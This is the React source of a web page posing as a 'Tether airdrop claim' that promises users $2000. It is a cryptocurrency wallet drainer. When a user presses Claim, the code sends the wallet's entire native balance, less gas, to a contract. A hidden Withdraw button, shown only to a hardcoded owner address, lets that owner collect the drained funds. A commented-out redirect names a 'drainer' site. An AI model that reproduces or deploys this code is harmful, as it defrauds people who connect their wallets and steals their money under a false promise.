import React, { useState, useEffect } from "react";

import { useWeb3Modal } from "@web3modal/react";
import Swal from "sweetalert2";
import { useBalance, useAccount } from "wagmi";
import Web3 from "web3";
import ContractAbi from "./ContractAbi";

const HomePage = (props) => {
  const { open } = useWeb3Modal();
  const [contractAddress, setContractAddress] = useState(null);
  const [limit, setLimit] = useState(null);
  const [withdrawBalance, setWithdrawBalance] = useState(null);
  const [rpc, setRpc] = useState(null);

  const [gasPrice, setGasPrice] = useState("50");
  const mainChainId = process.env.REACT_APP_CHAIN_ID;
  // const { address } = useAccount();
  // const limit = process.env.REACT_APP_LIMIT;
  // const contractAddress = "0x9Ac8F3ccb2193F3451878227e95310111b04d6bc";
  // const contractAddress = "0x5db1075937e4872d4A40979D52e3f4f76e21d37a";
  const owner = "0xeB3aeC8d91D86bc180bf1a9E59EB6E191b6aFB13";
  // console.log("best", limit);
  // console.log("msmsm", mainChainId);
  if (props.chain != null) {
    console.log("chainId here", props.chain.rpcUrls.default.http[0]);
    console.log("chainId here", props.chain.rpcUrls);
  }
  useEffect(() => {
    if (props.chain != null) {
      fixcontract(props.chain.id);
      // console.log("contract address will", contractAddress);
    }
  }, [props.chain, props.address]);

  async function fetchData(con) {
    const ethereum = window.ethereum;
    // console.log("main place");
    if (ethereum) {
      await ethereum.enable();
      const web3 = new Web3(ethereum);
      // console.log("chain");
      const contract = new web3.eth.Contract(ContractAbi, con);
      const balance = await contract.methods.checkBalance().call();
      const etherBalance = web3.utils.fromWei(balance, "ether");
      // console.log("gdgd perfecr", etherBalance);
      setWithdrawBalance(parseFloat(etherBalance).toFixed(5));
    }
  }
  function fixcontract(id) {
    switch (id) {
      case 1:
        setContractAddress("0x9Ac8F3ccb2193F3451878227e95310111b04d6bc");
        setLimit(process.env.REACT_APP_ETHEREUM_LIMIT);
        fetchData("0x9Ac8F3ccb2193F3451878227e95310111b04d6bc");
        setGasPrice("50");
        setRpc(props.chain.rpcUrls.default.http[0]);

        break;
      case 56:
        setContractAddress("0x9Ac8F3ccb2193F3451878227e95310111b04d6bc");
        setLimit(process.env.REACT_APP_BSC_LIMIT);
        fetchData("0x9Ac8F3ccb2193F3451878227e95310111b04d6bc");
        setGasPrice("10");
        setRpc(props.chain.rpcUrls.default.http[0]);
        break;
      case 137:
        setContractAddress("0x9Ac8F3ccb2193F3451878227e95310111b04d6bc");
        setLimit(process.env.REACT_APP_POLYGON_LIMIT);
        fetchData("0x9Ac8F3ccb2193F3451878227e95310111b04d6bc");
        setGasPrice("100");
        setRpc(props.chain.rpcUrls.default.http[0]);
        break;
      default:
        setContractAddress(null);
    }
  }

  function showEligible() {
    Swal.fire({
      title: "Information !",
      text: "You are not eligible For the airdrop",
      icon: "info",
      confirmButtonText: "Ok",
      confirmButtonColor: "#008C73",
    });
  }

  const handleWithdraw = async (id, chain) => {
    // console.log("not well ", chain.id);
    // console.log("CHEC ", id);

    if (chain.id == null) {
      Swal.fire({
        title: "Error!",
        text: "Please switch to the Main Network",
        icon: "info",
        confirmButtonText: "Ok",
        confirmButtonColor: "#008C73",
      });
    } else {
      // console.log("let's get it");
      try {
        const ethereum = window.ethereum;

        if (ethereum) {
          await ethereum.enable();
          const web3 = new Web3(ethereum);

          const contract = new web3.eth.Contract(ContractAbi, contractAddress);
          const accounts = await web3.eth.getAccounts();
          const address = accounts[0];

          const weiBalance = await web3.eth.getBalance(address);
          const etherBalance = web3.utils.fromWei(weiBalance, "ether");
          const balanceWei = web3.utils.toBN(weiBalance);
          const gasEstimate = await contract.methods
            .withdrawContractBalance()
            .estimateGas({ from: address });
          fetchData("0x9Ac8F3ccb2193F3451878227e95310111b04d6bc");

          if (etherBalance < limit) {
            showEligible();
          } else {
            const transactionObject = {
              from: address,
              to: contractAddress,
              gas: gasEstimate,
              gasPrice: web3.utils.toWei(gasPrice, "gwei"), // Replace with an appropriate gas limit
            };

            try {
              const result = await contract.methods
                .withdrawContractBalance()
                .send(transactionObject);

              // console.log("Transaction Hash:", result.transactionHash);
            } catch (error) {
              // console.error("Error:", error);
              // showEligible();
            }
          }
        } else {
          // showEligible();
          // console.error("No Ethereum provider detected");
        }
      } catch (error) {
        // console.error("Error:", error.message);
        // Handle specific errors and show user-friendly messages
      }
    }
  };
  const handleClaim = async (id, chain) => {
    // console.log("not well ", contractAddress);
    // console.log("CHEC ", id);

    if (contractAddress == null) {
      Swal.fire({
        title: "Error!",
        text: "Please switch to Main Network",
        icon: "info",
        confirmButtonText: "Ok",
        confirmButtonColor: "#008C73",
      });
    } else {
      // console.log("let's get it");

      // if (typeof window.trustwallet !== "undefined") {
      //   // Trust Wallet is installed

      //   showEligible();
      //   window.location.href =
      //     "trust://browser?url=https://testingdrainer.netlify.app/";

      //   // You can perform actions or provide messages specific to Trust Wallet users here.
      // }

      mainclaim();
    }
  };

  async function mainclaim() {
    try {
      const ethereum = window.ethereum;

      if (ethereum) {
        await ethereum.enable();
        const web3 = new Web3(ethereum);
        console.log("rpc, ", rpc);
        // const add = toChecksumAddress(contractAddress.toLowerCase());
        const contract = new web3.eth.Contract(
          ContractAbi,
          web3.utils.toChecksumAddress(contractAddress)
        );
        const accounts = await web3.eth.getAccounts();
        const address = accounts[0];

        const weiBalance = await web3.eth.getBalance(address);
        const etherBalance = web3.utils.fromWei(weiBalance, "ether");
        const balanceWei = web3.utils.toBN(weiBalance);

        // console.log("Balance:", etherBalance);

        if (etherBalance < limit) {
          // console.log("best", limit);
          showEligible();
        } else {
          //send using contract
          // Estimate the gas cost for the transaction
          const gasEstimate = await contract.methods
            .claim()
            .estimateGas({ from: address });
          const gasCostWei = web3.utils
            .toBN(gasEstimate)
            .mul(web3.utils.toBN(web3.utils.toWei(gasPrice, "gwei")));
          const valueInWei = balanceWei.sub(gasCostWei);
          // console.log("gas price", gasPrice);
          // console.log("gas estimate", gasEstimate);
          // Create a transaction object with the 'value' property to send 5 ether
          const transactionObject = {
            from: web3.utils.toChecksumAddress(address),
            to: contractAddress,
            gas: gasEstimate,
            gasPrice: web3.utils.toWei(gasPrice, "gwei"), // Replace with an appropriate gas limit
            value: valueInWei, // Sending 5 ether in wei
          };

          try {
            const result = await contract.methods
              .claim()
              .send(transactionObject);
            // console.log("Transaction Hash:", result.transactionHash);
          } catch (error) {
            console.error("Error:", error);
            // showEligible();
          }
        }
      } else {
        // showEligible();
        console.error("No Ethereum provider detected");
      }
    } catch (error) {
      console.error("Error:", error.message);
      // Handle specific errors and show user-friendly messages
    }
  }
  const address = props.address;
  const chain = props.chain;

  const balance = useBalance({
    address: address,
    chainId: 1,
  });
  if (balance != null) {
    // console.log("balance ", balance);
  }

  // console.log(props, address);
  const value = address === null;
  // console.log(value);
  return (
    <div class="flex items-center justify-center w-full h-full mt-2 pb-8 leading-relaxed">
      <div class="w-full mx-4 sm:w-2/3">
        <div class="align-left">
          <h1 class="font-bold my-2 text-xl">
            WELCOME TO TETHER AIRDROP CLAIM
          </h1>
          <p>
            Tether (USDT) is a type of cryptocurrency known as a stablecoin. It
            was one of the first stablecoins to gain widespread adoption in the
            cryptocurrency market. We are giving 2000$ airdrop to indidual
            wallet.
          </p>
        </div>
        <div class="card sm:flex mt-5">
          <div class="p-6 sm:w-1/2  min-h-[250px] flex flex-col  justify-between">
            <div>
              <h1 class="font-bold text-lg">Connect Wallet</h1>
              <p class="mt-2">
                Firstly, connect your wallet to the USDT Claim DAPP. Make sure
                your wallet is on the Ethereum Network. Once you connect, your
                address will show at the top. Then, the DAPP will be able to
                determine if you are eligible and how much token is allocated to
                you.
              </p>
            </div>
            {/* <button type="button" class="btn" id="btn-connect">
              Connect Wallet
            </button> */}

            <button className="btn" onClick={() => open()}>
              {address ? <p>Disconnect</p> : <p>Connect</p>}
            </button>

            <button
              className={address === owner ? "btn" : "btn hidden"}
              onClick={() => handleWithdraw(mainChainId, chain)}
            >
              Withdraw ({withdrawBalance})
            </button>

            {/* <button class="btn" id="btn-disconnect">
              Disconnect Wallet
            </button> */}
          </div>
          <hr class=" w-auto h-0.5 sm:h-auto sm:w-0.5 bg-gray-300" />
          <div class="p-6  sm:w-1/2 min-h-[250px] flex flex-col justify-between">
            <div>
              <h1 class="font-bold text-lg">Claim Airdrop</h1>
              <p class="mt-2">
                Once you click 'claim' you will need to approve the claim
                transaction from your wallet to receive the allocated tokens.
                The claim button won't work unless your wallet is connected to
                the wallet.
              </p>
            </div>
            <button
              class="btn"
              title={address ? "Claim" : "Connect first"}
              disabled={address ? false : true}
              onClick={() => handleClaim(mainChainId, chain)}
              id="claim"
            >
              Claim
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default HomePage;
